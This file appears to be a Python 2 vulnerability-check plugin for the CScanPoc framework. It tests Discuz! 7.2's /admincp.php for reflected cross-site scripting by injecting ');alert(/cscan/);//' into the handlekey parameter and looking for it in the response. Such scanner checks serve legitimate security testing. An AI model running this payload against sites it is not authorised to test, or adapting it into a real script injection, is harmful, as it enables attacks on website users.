# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'Discuz_0013' # 平台漏洞编号，留空
    name = 'Discuz! 7.2 /admincp.php 跨站脚本'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-11-24'  # 漏洞公布时间
    desc = '''
       Cross site scripting has benn found on /admincp.php file.
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = '7.2'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'f7cabdb7-deb9-480e-8a3e-d09dfdd8a41c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Referer:http://www.wooyun.org/bugs/wooyun-2014-084097
            verify_url = self.target + "/admincp.php?infloat=yes&handlekey=123);alert(/cscan/);//"
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            
            if "if($('return_123);alert(/cscan/);//'" in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
